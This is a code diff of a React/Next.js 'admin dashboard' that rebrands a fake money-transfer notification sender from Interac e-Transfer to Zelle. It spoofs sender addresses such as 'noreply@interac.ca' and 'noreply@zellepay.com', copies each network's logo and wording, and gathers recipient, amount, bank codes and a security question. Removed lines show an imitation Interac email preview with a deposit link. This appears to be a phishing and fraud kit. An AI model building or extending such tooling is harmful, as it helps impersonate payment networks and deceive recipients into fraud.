@@ -9,9 +9,6 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Textarea } from "@/components/ui/textarea"
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
-import { InteracEmailLayout } from "@/components/email/interac-email-layout"
-import { TransferCard } from "@/components/email/transfer-card"
-import { MessageSection } from "@/components/email/message-section"
 import { useRouter } from "next/navigation"
 
 interface TransferStatus {
@@ -56,9 +53,9 @@ export default function AdminDashboard() {
     setSubmitStatus({ type: null, message: "" })
 
     try {
-      const reference = formData.reference || `INTC-${Date.now().toString().slice(-6)}`
+      const reference = formData.reference || `ZELLE-${Date.now().toString().slice(-6)}`
 
-      const response = await fetch("/api/send-interac", {
+      const response = await fetch("/api/send-zelle", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -68,8 +65,8 @@ export default function AdminDashboard() {
           reference,
           senderEmail:
             typeof window !== "undefined"
-              ? process.env.NEXT_PUBLIC_SENDER_EMAIL || "noreply@interac.ca"
-              : "noreply@interac.ca",
+              ? process.env.NEXT_PUBLIC_SENDER_EMAIL || "noreply@zellepay.com"
+              : "noreply@zellepay.com",
           appUrl: typeof window !== "undefined" ? process.env.NEXT_PUBLIC_APP_URL || window.location.origin : "",
         }),
       })
@@ -77,7 +74,7 @@ export default function AdminDashboard() {
       const data = await response.json()
 
       if (!response.ok) {
-        throw new Error(data.error || "Failed to send Interac e-Transfer")
+        throw new Error(data.error || "Failed to send Zelle payment")
       }
 
       const newTransfer: TransferStatus = {
@@ -94,7 +91,7 @@ export default function AdminDashboard() {
 
       setSubmitStatus({
         type: "success",
-        message: `Interac e-Transfer of $${formData.amount} successfully sent to ${formData.recipientEmail}`,
+        message: `Zelle payment of $${formData.amount} USD successfully sent to ${formData.recipientEmail}`,
       })
 
       setTimeout(() => {
@@ -125,7 +122,7 @@ export default function AdminDashboard() {
     } catch (error) {
       setSubmitStatus({
         type: "error",
-        message: error instanceof Error ? error.message : "Failed to send Interac e-Transfer",
+        message: error instanceof Error ? error.message : "Failed to send Zelle payment",
       })
     } finally {
       setIsSubmitting(false)
@@ -143,32 +140,28 @@ export default function AdminDashboard() {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100">
+    <div className="min-h-screen bg-zinc-950">
       {/* Header */}
-      <header className="border-b bg-white shadow-sm">
-        <div className="container mx-auto px-4 py-4 md:py-6">
+      <header className="border-b border-zinc-800 bg-zinc-900/80 backdrop-blur-sm">
+        <div className="container mx-auto px-4 py-4 md:py-5 max-w-7xl">
           <div className="flex items-center justify-between gap-3">
             <div className="flex items-center gap-3">
-              <div className="w-12 h-12 bg-[#FDB913] rounded-lg flex items-center justify-center p-2">
-                <img
-                  src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
-                  alt="Interac Logo"
-                  className="w-full h-full object-contain"
-                />
+              <div className="w-11 h-11 bg-[#6D1ED4] rounded-xl flex items-center justify-center shadow-lg shadow-[#6D1ED4]/30">
+                <span className="text-white font-black text-2xl leading-none">Z</span>
               </div>
               <div>
-                <h1 className="text-2xl font-bold text-foreground">Interac Partner Network</h1>
-                <p className="text-sm text-muted-foreground">e-Transfer Management Dashboard Portal</p>
+                <h1 className="text-xl font-bold text-white">Zelle Admin</h1>
+                <p className="text-xs text-zinc-500">Payment Management Dashboard</p>
               </div>
             </div>
             <button
               onClick={() => setShowPendingTransfers(true)}
-              className="flex items-center gap-2 px-4 py-2 bg-[#FDB913] text-[#1a1a1a] rounded-lg font-semibold hover:bg-[#e5a811] transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
+              className="flex items-center gap-2 px-4 py-2 bg-zinc-800 border border-zinc-700 text-zinc-300 hover:text-white hover:border-zinc-600 rounded-xl font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] text-sm"
             >
-              <Clock className="w-5 h-5" />
-              <span>Pending Transfers</span>
+              <Clock className="w-4 h-4" />
+              <span>Pending</span>
               {recentTransfers.filter((t) => t.status === "pending").length > 0 && (
-                <span className="ml-1 px-2 py-0.5 bg-[#1a1a1a] text-[#FDB913] text-xs font-bold rounded-full">
+                <span className="ml-1 px-2 py-0.5 bg-[#6D1ED4] text-white text-xs font-bold rounded-full">
                   {recentTransfers.filter((t) => t.status === "pending").length}
                 </span>
               )}
@@ -181,29 +174,28 @@ export default function AdminDashboard() {
         <div className="grid lg:grid-cols-3 gap-6">
           {/* Transfer Form */}
           <div className="lg:col-span-2">
-            <Card className="shadow-lg border-2">
+            <Card className="bg-zinc-900 border-zinc-800">
               <CardHeader>
-                <CardTitle className="text-2xl flex items-center gap-2">
-                  <Send className="w-6 h-6 text-[#FDB913]" />
-                  Send Interac e-Transfer
+                <CardTitle className="text-xl flex items-center gap-2 text-white">
+                  <Send className="w-5 h-5 text-[#6D1ED4]" />
+                  Send Zelle Payment
                 </CardTitle>
-                <CardDescription>Send secure money transfers via email with SendGrid</CardDescription>
+                <CardDescription className="text-zinc-500">Send secure money transfers via email</CardDescription>
               </CardHeader>
               <CardContent>
                 <form onSubmit={handleSubmit} className="space-y-6">
                   {/* Recipient Information */}
-                  <div className="space-y-4 p-5 bg-muted/50 rounded-lg border">
-                    <h3 className="font-semibold text-lg flex items-center gap-2">
-                      <User className="w-5 h-5 text-[#FDB913]" />
+                  <div className="space-y-4 p-5 bg-zinc-800/50 rounded-xl border border-zinc-700/50">
+                    <h3 className="font-semibold text-sm text-zinc-300 flex items-center gap-2">
+                      <User className="w-4 h-4 text-[#6D1ED4]" />
                       Recipient Information
                     </h3>
 
                     <div className="grid md:grid-cols-2 gap-4">
                       <div className="space-y-2">
-                        <Label htmlFor="recipientEmail" className="flex items-center gap-2">
-                          <Mail className="w-4 h-4 text-[#FDB913]" />
-                          Email Address
-                          <span className="text-red-500">*</span>
+                        <Label htmlFor="recipientEmail" className="text-zinc-400 text-xs flex items-center gap-2">
+                          <Mail className="w-3.5 h-3.5 text-[#6D1ED4]" />
+                          Email Address <span className="text-red-400">*</span>
                         </Label>
                         <Input
                           id="recipientEmail"
@@ -211,15 +203,14 @@ export default function AdminDashboard() {
                           placeholder="recipient@example.com"
                           value={formData.recipientEmail}
                           onChange={(e) => setFormData({ ...formData, recipientEmail: e.target.value })}
-                          className="border-2 focus-visible:ring-[#FDB913]"
+                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                           required
                         />
                       </div>
 
                       <div className="space-y-2">
-                        <Label htmlFor="recipientName">
-                          Recipient Name
-                          <span className="text-red-500 ml-1">*</span>
+                        <Label htmlFor="recipientName" className="text-zinc-400 text-xs">
+                          Recipient Name <span className="text-red-400">*</span>
                         </Label>
                         <Input
                           id="recipientName"
@@ -227,7 +218,7 @@ export default function AdminDashboard() {
                           placeholder="John Doe"
                           value={formData.recipientName}
                           onChange={(e) => setFormData({ ...formData, recipientName: e.target.value })}
-                          className="border-2 focus-visible:ring-[#FDB913]"
+                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                           required
                         />
                       </div>
@@ -235,17 +226,16 @@ export default function AdminDashboard() {
                   </div>
 
                   {/* Transfer Details */}
-                  <div className="space-y-4 p-5 bg-muted/50 rounded-lg border">
-                    <h3 className="font-semibold text-lg flex items-center gap-2">
-                      <DollarSign className="w-5 h-5 text-[#FDB913]" />
+                  <div className="space-y-4 p-5 bg-zinc-800/50 rounded-xl border border-zinc-700/50">
+                    <h3 className="font-semibold text-sm text-zinc-300 flex items-center gap-2">
+                      <DollarSign className="w-4 h-4 text-[#6D1ED4]" />
                       Transfer Details
                     </h3>
 
                     <div className="grid md:grid-cols-2 gap-4">
                       <div className="space-y-2">
-                        <Label htmlFor="amount">
-                          Amount (CAD)
-                          <span className="text-red-500 ml-1">*</span>
+                        <Label htmlFor="amount" className="text-zinc-400 text-xs">
+                          Amount (USD) <span className="text-red-400">*</span>
                         </Label>
                         <Input
                           id="amount"
@@ -255,73 +245,73 @@ export default function AdminDashboard() {
                           placeholder="100.00"
                           value={formData.amount}
                           onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
-                          className="border-2 focus-visible:ring-[#FDB913] text-lg font-semibold"
+                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-semibold"
                           required
                         />
                       </div>
 
                       <div className="space-y-2">
-                        <Label htmlFor="reference">Reference Number</Label>
+                        <Label htmlFor="reference" className="text-zinc-400 text-xs">Reference Number</Label>
                         <Input
                           id="reference"
                           type="text"
                           placeholder="Auto-generated"
                           value={formData.reference}
                           onChange={(e) => setFormData({ ...formData, reference: e.target.value })}
-                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
+                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-mono"
                         />
                       </div>
                     </div>
 
                     <div className="space-y-2">
-                      <Label htmlFor="message">Message (Optional)</Label>
+                      <Label htmlFor="message" className="text-zinc-400 text-xs">Message (Optional)</Label>
                       <Textarea
                         id="message"
                         placeholder="Add a message for the recipient..."
                         value={formData.message}
                         onChange={(e) => setFormData({ ...formData, message: e.target.value })}
-                        className="border-2 focus-visible:ring-[#FDB913] min-h-[100px]"
+                        className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] min-h-[80px] resize-none"
                         maxLength={200}
                       />
-                      <p className="text-xs text-muted-foreground">{formData.message.length}/200 characters</p>
+                      <p className="text-xs text-zinc-600">{formData.message.length}/200 characters</p>
                     </div>
 
                     {/* Bank Information */}
-                    <div className="grid md:grid-cols-3 gap-4 pt-2">
+                    <div className="grid md:grid-cols-3 gap-4 pt-1">
                       <div className="space-y-2">
-                        <Label htmlFor="bankName">Bank Name</Label>
+                        <Label htmlFor="bankName" className="text-zinc-400 text-xs">Bank Name</Label>
                         <Input
                           id="bankName"
                           type="text"
                           placeholder="Banking System"
                           value={formData.bankName}
                           onChange={(e) => setFormData({ ...formData, bankName: e.target.value })}
-                          className="border-2 focus-visible:ring-[#FDB913]"
+                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                         />
                       </div>
 
                       <div className="space-y-2">
-                        <Label htmlFor="institutionCode">Institution Code</Label>
+                        <Label htmlFor="institutionCode" className="text-zinc-400 text-xs">Institution Code</Label>
                         <Input
                           id="institutionCode"
                           type="text"
                           placeholder="000"
                           value={formData.institutionCode}
                           onChange={(e) => setFormData({ ...formData, institutionCode: e.target.value })}
-                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
+                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-mono"
                           maxLength={3}
                         />
                       </div>
 
                       <div className="space-y-2">
-                        <Label htmlFor="branchCode">Branch Code</Label>
+                        <Label htmlFor="branchCode" className="text-zinc-400 text-xs">Branch Code</Label>
                         <Input
                           id="branchCode"
                           type="text"
                           placeholder="00000"
                           value={formData.branchCode}
                           onChange={(e) => setFormData({ ...formData, branchCode: e.target.value })}
-                          className="border-2 focus-visible:ring-[#FDB913] font-mono"
+                          className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4] font-mono"
                           maxLength={5}
                         />
                       </div>
@@ -329,13 +319,12 @@ export default function AdminDashboard() {
                   </div>
 
                   {/* Security */}
-                  <div className="space-y-4 p-5 bg-muted/50 rounded-lg border">
-                    <h3 className="font-semibold text-lg">Security Question & Answer</h3>
+                  <div className="space-y-4 p-5 bg-zinc-800/50 rounded-xl border border-zinc-700/50">
+                    <h3 className="font-semibold text-sm text-zinc-300">Security Question &amp; Answer</h3>
 
                     <div className="space-y-2">
-                      <Label htmlFor="securityQuestion">
-                        Security Question
-                        <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="securityQuestion" className="text-zinc-400 text-xs">
+                        Security Question <span className="text-red-400">*</span>
                       </Label>
                       <Input
                         id="securityQuestion"
@@ -343,15 +332,14 @@ export default function AdminDashboard() {
                         placeholder="e.g., What is your favorite color?"
                         value={formData.securityQuestion}
                         onChange={(e) => setFormData({ ...formData, securityQuestion: e.target.value })}
-                        className="border-2 focus-visible:ring-[#FDB913]"
+                        className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                         required
                       />
                     </div>
 
                     <div className="space-y-2">
-                      <Label htmlFor="securityAnswer">
-                        Security Answer
-                        <span className="text-red-500 ml-1">*</span>
+                      <Label htmlFor="securityAnswer" className="text-zinc-400 text-xs">
+                        Security Answer <span className="text-red-400">*</span>
                       </Label>
                       <Input
                         id="securityAnswer"
@@ -359,10 +347,10 @@ export default function AdminDashboard() {
                         placeholder="Enter the answer"
                         value={formData.securityAnswer}
                         onChange={(e) => setFormData({ ...formData, securityAnswer: e.target.value })}
-                        className="border-2 focus-visible:ring-[#FDB913]"
+                        className="bg-zinc-800 border-zinc-700 text-white placeholder:text-zinc-600 focus:border-[#6D1ED4]"
                         required
                       />
-                      <p className="text-xs text-muted-foreground">
+                      <p className="text-xs text-zinc-600">
                         The recipient will need this answer to accept the transfer
                       </p>
                     </div>
@@ -371,20 +359,20 @@ export default function AdminDashboard() {
                   {/* Status Messages */}
                   {submitStatus.type && (
                     <div
-                      className={`p-4 rounded-lg border-2 flex items-start gap-3 ${
-                        submitStatus.type === "success" ? "bg-green-50 border-green-200" : "bg-red-50 border-red-200"
+                      className={`p-4 rounded-xl border flex items-start gap-3 ${
+                        submitStatus.type === "success"
+                          ? "bg-green-950/50 border-green-900/50"
+                          : "bg-red-950/50 border-red-900/50"
                       }`}
                     >
                       {submitStatus.type === "success" ? (
-                        <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
+                        <CheckCircle className="w-5 h-5 text-green-400 flex-shrink-0 mt-0.5" />
                       ) : (
-                        <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
+                        <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                       )}
-                      <p
-                        className={`text-sm font-medium ${
-                          submitStatus.type === "success" ? "text-green-700" : "text-red-700"
-                        }`}
-                      >
+                      <p className={`text-sm font-medium ${
+                        submitStatus.type === "success" ? "text-green-400" : "text-red-400"
+                      }`}>
                         {submitStatus.message}
                       </p>
                     </div>
@@ -394,18 +382,18 @@ export default function AdminDashboard() {
                   <Button
                     type="submit"
                     disabled={isSubmitting}
-                    className="w-full bg-[#FDB913] text-[#1a1a1a] hover:bg-[#e5a811] text-lg py-6 font-bold"
+                    className="w-full bg-[#6D1ED4] hover:bg-[#5A18B0] text-white text-base py-6 font-bold"
                     size="lg"
                   >
                     {isSubmitting ? (
                       <>
-                        <div className="w-5 h-5 border-2 border-[#1a1a1a] border-t-transparent rounded-full animate-spin" />
+                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                         <span>Sending...</span>
                       </>
                     ) : (
                       <>
                         <Send className="w-5 h-5" />
-                        <span>Send Interac e-Transfer</span>
+                        <span>Send Zelle Payment</span>
                         <ArrowRight className="w-5 h-5" />
                       </>
                     )}
@@ -417,40 +405,40 @@ export default function AdminDashboard() {
 
           {/* Recent Transfers Sidebar */}
           <div className="lg:col-span-1">
-            <Card className="shadow-lg border-2">
+            <Card className="bg-zinc-900 border-zinc-800">
               <CardHeader>
-                <CardTitle className="text-xl flex items-center gap-2">
-                  <Clock className="w-5 h-5 text-[#FDB913]" />
+                <CardTitle className="text-base flex items-center gap-2 text-white">
+                  <Clock className="w-4 h-4 text-[#6D1ED4]" />
                   Recent Transfers
                 </CardTitle>
-                <CardDescription>Last 10 transactions</CardDescription>
+                <CardDescription className="text-zinc-500">Last 10 transactions</CardDescription>
               </CardHeader>
               <CardContent>
                 <div className="space-y-3">
                   {recentTransfers.length === 0 ? (
-                    <p className="text-sm text-muted-foreground text-center py-8">No recent transfers</p>
+                    <p className="text-sm text-zinc-600 text-center py-8">No recent transfers</p>
                   ) : (
                     recentTransfers.map((transfer) => (
                       <div
                         key={transfer.id}
-                        className="p-4 rounded-lg border-2 bg-card hover:bg-muted/50 transition-colors cursor-pointer group"
+                        className="p-4 rounded-xl border border-zinc-800 bg-zinc-800/50 hover:border-zinc-700 transition-colors cursor-pointer group"
                         onClick={() => setPreviewTransfer(transfer)}
                       >
                         <div className="flex items-start justify-between mb-2">
                           <div className="flex-1 min-w-0">
-                            <p className="font-semibold text-sm truncate">{transfer.recipientName}</p>
-                            <p className="text-xs text-muted-foreground truncate">{transfer.recipient}</p>
-                            <p className="text-xs text-muted-foreground">{formatTimestamp(transfer.timestamp)}</p>
+                            <p className="font-semibold text-sm text-white truncate">{transfer.recipientName}</p>
+                            <p className="text-xs text-zinc-500 truncate">{transfer.recipient}</p>
+                            <p className="text-xs text-zinc-600">{formatTimestamp(transfer.timestamp)}</p>
                           </div>
                           <div className="flex items-center gap-2">
-                            <Eye className="w-4 h-4 text-[#FDB913] opacity-0 group-hover:opacity-100 transition-opacity" />
+                            <Eye className="w-4 h-4 text-[#6D1ED4] opacity-0 group-hover:opacity-100 transition-opacity" />
                             <div
                               className={`px-2 py-1 rounded text-xs font-medium ${
                                 transfer.status === "sent"
-                                  ? "bg-green-100 text-green-700"
+                                  ? "bg-green-500/10 text-green-400"
                                   : transfer.status === "pending"
-                                    ? "bg-yellow-100 text-yellow-700"
-                                    : "bg-red-100 text-red-700"
+                                    ? "bg-yellow-500/10 text-yellow-400"
+                                    : "bg-red-500/10 text-red-400"
                               }`}
                             >
                               {transfer.status}
@@ -458,8 +446,8 @@ export default function AdminDashboard() {
                           </div>
                         </div>
                         <div className="flex items-center justify-between">
-                          <span className="text-lg font-bold text-[#FDB913]">${transfer.amount.toFixed(2)} CAD</span>
-                          <span className="text-xs text-muted-foreground font-mono">{transfer.id}</span>
+                          <span className="text-base font-bold text-[#6D1ED4]">${transfer.amount.toFixed(2)} USD</span>
+                          <span className="text-xs text-zinc-600 font-mono">{transfer.id}</span>
                         </div>
                       </div>
                     ))
@@ -471,85 +459,65 @@ export default function AdminDashboard() {
         </div>
       </main>
 
+      {/* Transfer Detail Modal */}
       <Dialog open={previewTransfer !== null} onOpenChange={() => setPreviewTransfer(null)}>
-        <DialogContent className="max-w-5xl max-h-[90vh] overflow-y-auto">
+        <DialogContent className="max-w-xl max-h-[90vh] overflow-y-auto bg-zinc-900 border-zinc-800 text-white">
           <DialogHeader>
-            <DialogTitle className="flex items-center gap-2">
-              <Mail className="w-5 h-5 text-[#FDB913]" />
-              Transaction Details - {previewTransfer?.id}
+            <DialogTitle className="flex items-center gap-2 text-white">
+              <Mail className="w-5 h-5 text-[#6D1ED4]" />
+              Transaction Details — {previewTransfer?.id}
             </DialogTitle>
           </DialogHeader>
 
           {previewTransfer && (
-            <div className="space-y-6 mt-4">
-              {/* Transaction Summary Card */}
-              <div className="bg-zinc-900 rounded-2xl border border-zinc-800 p-6 space-y-6">
-                <div className="flex items-center justify-between pb-4 border-b border-zinc-800">
-                  <h3 className="text-lg font-semibold text-white">Transaction Details</h3>
+            <div className="space-y-5 mt-2">
+              <div className="bg-zinc-800/60 rounded-xl border border-zinc-700 p-5 space-y-5">
+                <div className="flex items-center justify-between pb-4 border-b border-zinc-700">
+                  <h3 className="text-base font-semibold text-white">Transfer Summary</h3>
                   <span className="px-3 py-1 rounded-full text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
                     {previewTransfer.status.toUpperCase()}
                   </span>
                 </div>
 
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                   <div className="space-y-1">
-                    <p className="text-sm text-zinc-500">Amount</p>
-                    <p className="text-xl font-bold text-white">${previewTransfer.amount.toFixed(2)} CAD</p>
+                    <p className="text-xs text-zinc-500">Amount</p>
+                    <p className="text-xl font-bold text-white">${previewTransfer.amount.toFixed(2)} USD</p>
                   </div>
 
                   <div className="space-y-1">
-                    <p className="text-sm text-zinc-500">Reference</p>
-                    <p className="text-base font-mono text-white">{previewTransfer.id}</p>
+                    <p className="text-xs text-zinc-500">Reference</p>
+                    <p className="text-sm font-mono text-white">{previewTransfer.id}</p>
                   </div>
 
                   <div className="space-y-1">
-                    <p className="text-sm text-zinc-500">Payee</p>
-                    <p className="text-base text-white">{previewTransfer.recipientName}</p>
-                    <p className="text-sm text-zinc-400">{previewTransfer.recipient}</p>
+                    <p className="text-xs text-zinc-500">Recipient</p>
+                    <p className="text-sm text-white">{previewTransfer.recipientName}</p>
+                    <p className="text-xs text-zinc-400">{previewTransfer.recipient}</p>
                   </div>
 
                   <div className="space-y-1">
-                    <p className="text-sm text-zinc-500">Bank</p>
-                    <p className="text-base text-white">{formData.bankName}</p>
-                    <p className="text-sm text-zinc-400">
+                    <p className="text-xs text-zinc-500">Bank</p>
+                    <p className="text-sm text-white">{formData.bankName}</p>
+                    <p className="text-xs text-zinc-400">
                       {formData.institutionCode}-{formData.branchCode}
                     </p>
                   </div>
 
                   {previewTransfer.message && (
                     <div className="space-y-1 md:col-span-2">
-                      <p className="text-sm text-zinc-500">Memo</p>
-                      <p className="text-base text-white">{previewTransfer.message}</p>
+                      <p className="text-xs text-zinc-500">Memo</p>
+                      <p className="text-sm text-white">{previewTransfer.message}</p>
                     </div>
                   )}
 
                   <div className="space-y-1 md:col-span-2">
-                    <p className="text-sm text-zinc-500">Timestamp</p>
-                    <p className="text-sm font-mono text-zinc-400">
+                    <p className="text-xs text-zinc-500">Timestamp</p>
+                    <p className="text-xs font-mono text-zinc-400">
                       {new Date(previewTransfer.timestamp).toLocaleString()}
                     </p>
                   </div>
                 </div>
-              </div>
-
-              {/* Email Preview */}
-              <div className="border rounded-lg p-4 bg-white">
-                <h4 className="font-semibold mb-4 text-zinc-900">Email Preview</h4>
-                <InteracEmailLayout senderName={formData.bankName} institution="Your Bank">
-                  <MessageSection
-                    recipientName={previewTransfer.recipientName}
-                    greeting={`Hi ${previewTransfer.recipientName},`}
-                    description="You've received a secure Interac e-Transfer."
-                  />
-
-                  <TransferCard
-                    amount={previewTransfer.amount}
-                    message={previewTransfer.message}
-                    securityQuestion={previewTransfer.securityQuestion || "Security question not provided"}
-                    depositLink="https://brandcentre.interac.ca/member-login/"
-                    transferId={previewTransfer.id}
-                  />
-                </InteracEmailLayout>
               </div>
             </div>
           )}
@@ -558,27 +526,27 @@ export default function AdminDashboard() {
 
       {/* Pending Transfers Modal */}
       <Dialog open={showPendingTransfers} onOpenChange={setShowPendingTransfers}>
-        <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
+        <DialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto bg-zinc-900 border-zinc-800 text-white">
           <DialogHeader>
-            <DialogTitle className="flex items-center gap-2">
-              <Clock className="w-5 h-5 text-[#FDB913]" />
+            <DialogTitle className="flex items-center gap-2 text-white">
+              <Clock className="w-5 h-5 text-[#6D1ED4]" />
               Pending Transfers
             </DialogTitle>
-            <DialogDescription>
+            <DialogDescription className="text-zinc-500">
               {recentTransfers.filter((t) => t.status === "pending").length} pending transfer(s)
             </DialogDescription>
           </DialogHeader>
 
           <div className="space-y-3 mt-4">
             {recentTransfers.filter((t) => t.status === "pending").length === 0 ? (
-              <p className="text-sm text-muted-foreground text-center py-8">No pending transfers</p>
+              <p className="text-sm text-zinc-600 text-center py-8">No pending transfers</p>
             ) : (
               recentTransfers
                 .filter((t) => t.status === "pending")
                 .map((transfer) => (
                   <div
                     key={transfer.id}
-                    className="p-4 rounded-lg border-2 bg-card hover:bg-muted/50 transition-colors cursor-pointer group"
+                    className="p-4 rounded-xl border border-zinc-800 bg-zinc-800/50 hover:border-zinc-700 transition-colors cursor-pointer group"
                     onClick={() => {
                       setPreviewTransfer(transfer)
                       setShowPendingTransfers(false)
@@ -586,20 +554,20 @@ export default function AdminDashboard() {
                   >
                     <div className="flex items-start justify-between mb-2">
                       <div className="flex-1 min-w-0">
-                        <p className="font-semibold text-sm truncate">{transfer.recipientName}</p>
-                        <p className="text-xs text-muted-foreground truncate">{transfer.recipient}</p>
-                        <p className="text-xs text-muted-foreground">{formatTimestamp(transfer.timestamp)}</p>
+                        <p className="font-semibold text-sm text-white truncate">{transfer.recipientName}</p>
+                        <p className="text-xs text-zinc-500 truncate">{transfer.recipient}</p>
+                        <p className="text-xs text-zinc-600">{formatTimestamp(transfer.timestamp)}</p>
                       </div>
                       <div className="flex items-center gap-2">
-                        <Eye className="w-4 h-4 text-[#FDB913] opacity-0 group-hover:opacity-100 transition-opacity" />
-                        <div className="px-2 py-1 rounded text-xs font-medium bg-yellow-100 text-yellow-700">
+                        <Eye className="w-4 h-4 text-[#6D1ED4] opacity-0 group-hover:opacity-100 transition-opacity" />
+                        <div className="px-2 py-1 rounded text-xs font-medium bg-yellow-500/10 text-yellow-400">
                           pending
                         </div>
                       </div>
                     </div>
                     <div className="flex items-center justify-between">
-                      <span className="text-lg font-bold text-[#FDB913]">${transfer.amount.toFixed(2)} CAD</span>
-                      <span className="text-xs text-muted-foreground font-mono">{transfer.id}</span>
+                      <span className="text-base font-bold text-[#6D1ED4]">${transfer.amount.toFixed(2)} USD</span>
+                      <span className="text-xs text-zinc-600 font-mono">{transfer.id}</span>
                     </div>
                   </div>
                 ))
